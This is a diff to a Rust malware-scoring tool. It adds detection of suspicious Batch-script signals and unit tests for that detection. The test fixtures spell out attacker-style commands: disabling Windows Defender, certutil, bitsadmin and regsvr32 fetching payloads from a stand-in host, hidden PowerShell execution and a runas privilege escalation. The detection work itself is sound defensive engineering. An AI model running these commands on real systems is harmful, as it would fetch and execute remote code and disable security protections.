@@ -615,6 +615,57 @@ pub fn extract_signals(result: &AnalysisResult) -> SignalSet {
         });
     }
 
+    // ── Cat C quick-win: Batch / shell intent signal extraction ────
+    // Runs only when the format or extension indicates a Batch-family
+    // script. Concatenates all classified string values into a blob
+    // (capped at 128 KB) and delegates the regex scan to
+    // anya_scoring::detection_patterns::count_batch_signals.
+    let is_batch_family = {
+        let fmt = result.file_format.to_lowercase();
+        let ext = s.file_extension.as_str();
+        fmt.contains("batch") || ext == "bat" || ext == "cmd"
+    };
+    if is_batch_family {
+        if let Some(ref classified) = result.strings.classified {
+            // Build the strings blob. Cap at 128 KB so pathologically
+            // large string sets don't blow up the regex scan budget.
+            const MAX_BLOB_BYTES: usize = 131072;
+            let mut blob = String::with_capacity(8192);
+            for cs in classified {
+                if blob.len() + cs.value.len() + 1 > MAX_BLOB_BYTES {
+                    break;
+                }
+                blob.push_str(&cs.value);
+                blob.push('\n');
+            }
+            let counts = anya_scoring::detection_patterns::count_batch_signals(&blob);
+            s.bat_lolbin_count = counts.lolbin;
+            s.bat_defender_tamper = counts.defender_tamper > 0;
+            s.bat_hidden_exec = counts.hidden_exec > 0;
+            s.bat_privesc = counts.privesc > 0;
+
+            // Feed the shell_* aggregation fields the same way the
+            // Python rescore does, so downstream shell/batch scoring
+            // has something to work with when the parser didn't
+            // populate shell_analysis.
+            if counts.download > 0 && (counts.lolbin > 0 || counts.privesc > 0 || counts.hidden_exec > 0) {
+                s.shell_has_download_execute = true;
+            }
+            if counts.persistence > 0 {
+                s.shell_has_persistence = true;
+            }
+            let derived_shell_count = counts.lolbin
+                + counts.download
+                + counts.persistence
+                + counts.defender_tamper
+                + counts.hidden_exec
+                + counts.privesc;
+            if derived_shell_count > s.shell_suspicious_count {
+                s.shell_suspicious_count = derived_shell_count;
+            }
+        }
+    }
+
     // ── Driver signal extraction ────────────────────────────────────
     if let Some(ref pe) = result.pe_analysis {
         if let Some(ref driver) = pe.driver_analysis {
@@ -1913,6 +1964,149 @@ mod tests {
                 .iter()
                 .any(|(desc, _)| desc.starts_with("ELF missing")),
             "regular executable missing all 3 should still flag"
+        );
+    }
+
+    fn batch_result_with_strings(strings: Vec<&str>) -> AnalysisResult {
+        let mut result = empty_result();
+        result.file_format = "Batch Script".to_string();
+        result.file_info.extension = Some("bat".to_string());
+        result.strings.classified = Some(strings.iter().map(|s| make_classified(s)).collect());
+        result
+    }
+
+    #[test]
+    fn test_batch_defender_tamper_fires_high() {
+        let result = batch_result_with_strings(vec![
+            "Set-MpPreference -DisableRealtimeMonitoring $true",
+            "powershell -WindowStyle Hidden -Command \"& { ... }\"",
+        ]);
+        let signals = extract_signals(&result);
+        assert!(
+            signals.bat_defender_tamper,
+            "Set-MpPreference should set bat_defender_tamper"
+        );
+        assert!(signals.bat_hidden_exec, "-WindowStyle Hidden should set bat_hidden_exec");
+
+        let scoring = score_signals(&signals);
+        assert!(
+            scoring
+                .detections
+                .iter()
+                .any(|(desc, _)| desc.contains("tamper with Windows Defender")),
+            "defender-tamper detection should fire"
+        );
+    }
+
+    #[test]
+    fn test_batch_privesc_fires_medium() {
+        let result = batch_result_with_strings(vec![
+            "runas /user:Administrator cmd.exe",
+            "RUNASINVOKER __COMPAT_LAYER=RUNASINVOKER",
+        ]);
+        let signals = extract_signals(&result);
+        assert!(signals.bat_privesc);
+
+        let scoring = score_signals(&signals);
+        assert!(
+            scoring
+                .detections
+                .iter()
+                .any(|(desc, _)| desc.contains("privilege-escalation bypass")),
+            "privesc detection should fire"
+        );
+    }
+
+    #[test]
+    fn test_batch_lolbin_plus_hidden_fires_high() {
+        // LOLBin >= 2 AND hidden exec should fire the High detection.
+        let result = batch_result_with_strings(vec![
+            "certutil -urlcache -split -f http://evil.example/payload.exe",
+            "bitsadmin /transfer job http://evil.example/x.exe %TEMP%\\x.exe",
+            "powershell -WindowStyle Hidden -enc AABBCC",
+            "start /b /min payload.exe",
+        ]);
+        let signals = extract_signals(&result);
+        assert!(
+            signals.bat_lolbin_count >= 2,
+            "expected >= 2 LOLBins, got {}",
+            signals.bat_lolbin_count
+        );
+        assert!(signals.bat_hidden_exec);
+
+        let scoring = score_signals(&signals);
+        assert!(
+            scoring
+                .detections
+                .iter()
+                .any(|(desc, _)| desc.contains("LOLBins with hidden execution")),
+            "LOLBin+hidden High detection should fire"
+        );
+    }
+
+    #[test]
+    fn test_batch_lolbin_3plus_without_hidden_fires_medium() {
+        // LOLBin >= 3 without hidden should fire the Medium fallback.
+        let result = batch_result_with_strings(vec![
+            "certutil -decode payload.b64 payload.exe",
+            "bitsadmin /reset",
+            "rundll32 shell32.dll,Control_RunDLL",
+            "regsvr32 /s /u /i:http://evil.example/o.sct scrobj.dll",
+        ]);
+        let signals = extract_signals(&result);
+        assert!(signals.bat_lolbin_count >= 3);
+        assert!(
+            !signals.bat_hidden_exec,
+            "no hidden patterns in this fixture"
+        );
+
+        let scoring = score_signals(&signals);
+        assert!(
+            scoring
+                .detections
+                .iter()
+                .any(|(desc, lvl)| desc.contains("LOLBins (certutil/bitsadmin")
+                    && *lvl == anya_scoring::types::ConfidenceLevel::Medium),
+            "LOLBin>=3 Medium detection should fire"
+        );
+    }
+
+    #[test]
+    fn test_batch_extractor_only_runs_for_batch_family() {
+        // A PE file with batch-looking strings should NOT populate
+        // bat_* signals because the extraction is gated on format.
+        let mut result = empty_result();
+        result.file_format = "Windows PE".to_string();
+        result.file_info.extension = Some("exe".to_string());
+        result.strings.classified = Some(vec![make_classified(
+            "Set-MpPreference -DisableRealtimeMonitoring $true",
+        )]);
+
+        let signals = extract_signals(&result);
+        assert!(
+            !signals.bat_defender_tamper,
+            "PE should not run Batch string extraction"
+        );
+        assert_eq!(signals.bat_lolbin_count, 0);
+    }
+
+    #[test]
+    fn test_batch_blob_cap_does_not_panic() {
+        // Build a huge string set and confirm the 128 KB cap kicks in
+        // without panicking or OOMing.
+        let big_line = "certutil ".repeat(1000); // ~9 KB per string
+        let mut strings: Vec<String> = Vec::new();
+        for _ in 0..500 {
+            strings.push(big_line.clone());
+        }
+        let refs: Vec<&str> = strings.iter().map(|s| s.as_str()).collect();
+        let result = batch_result_with_strings(refs);
+        let signals = extract_signals(&result);
+        // Count should cap at 50 per pattern, well below the total
+        assert!(
+            signals.bat_lolbin_count <= 50,
+            "count should cap at 50, got {}",
+            signals.bat_lolbin_count
         );
     }
 
